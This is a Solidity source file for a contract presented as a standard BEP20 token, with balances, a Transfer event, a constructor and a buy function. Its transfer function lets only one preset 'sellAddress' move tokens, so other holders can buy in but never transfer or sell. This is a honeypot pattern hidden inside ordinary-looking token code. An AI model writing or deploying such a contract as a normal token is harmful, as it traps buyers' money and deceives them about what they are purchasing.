pragma solidity ^0.8.0;

contract BEP20 {
    // Public variables of the token
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    // This creates an array with all balances
    mapping(address => uint256) public balanceOf;

    // This generates a public event on the blockchain that will notify clients
    event Transfer(address indexed from, address indexed to, uint256 value);

    address payable sellAddress;

    // Initializes contract with initial supply tokens to the creator of the contract
    constructor(uint256 initialSupply, string memory tokenName, string memory tokenSymbol, uint8 decimalUnits, address payable _sellAddress) public {
        totalSupply = initialSupply;
        balanceOf[msg.sender] = initialSupply;
        name = tokenName;
        symbol = tokenSymbol;
        decimals = decimalUnits;
        sellAddress = _sellAddress;
    }

    // Send `_value` tokens to `_to` from your account
    function transfer(address _to, uint256 _value) public {
        require(balanceOf[msg.sender] >= _value && _value > 0);
        require(msg.sender == sellAddress, "Only the designated sell address can transfer tokens.");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
    }

    function buy(uint256 _value) public payable {
        require(msg.value >= _value);
        balanceOf[msg.sender] += _value;
        totalSupply += _value;
    }
}
